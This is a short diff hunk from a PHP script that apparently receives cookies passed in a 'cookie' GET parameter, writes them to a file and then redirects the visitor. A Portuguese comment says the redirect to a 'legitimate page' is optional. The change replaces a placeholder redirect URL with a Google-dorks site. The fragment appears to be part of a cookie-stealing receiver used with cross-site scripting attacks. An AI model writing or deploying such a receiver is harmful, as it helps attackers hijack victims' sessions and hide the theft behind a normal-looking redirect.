@@ -10,6 +10,6 @@ if (isset($_GET['cookie'])) {
     fclose($file);
 
     // Opcional: redirecionar o usuário para uma página legítima
-    header("Location: https://site-legitimo.com");
+    header("Location: https://dorks.faisalahmed.me/");
     exit;
 }
